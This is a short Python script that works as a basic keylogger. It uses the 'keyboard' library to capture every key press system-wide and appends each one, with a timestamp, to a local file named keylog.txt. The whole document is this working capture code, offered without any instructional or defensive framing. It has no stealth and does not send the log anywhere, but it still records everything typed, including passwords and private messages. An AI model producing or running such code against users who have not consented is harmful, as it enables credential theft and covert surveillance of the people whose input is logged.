import keyboard
import datetime

log_file = "keylog.txt"

def on_key_press(event):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    with open(log_file, "a") as f:
        f.write(f"[{timestamp}] Key pressed: {event.name}\n")

keyboard.on_press(on_key_press)

print("Logging Begins.......")

keyboard.wait()

print("Logging Ends......")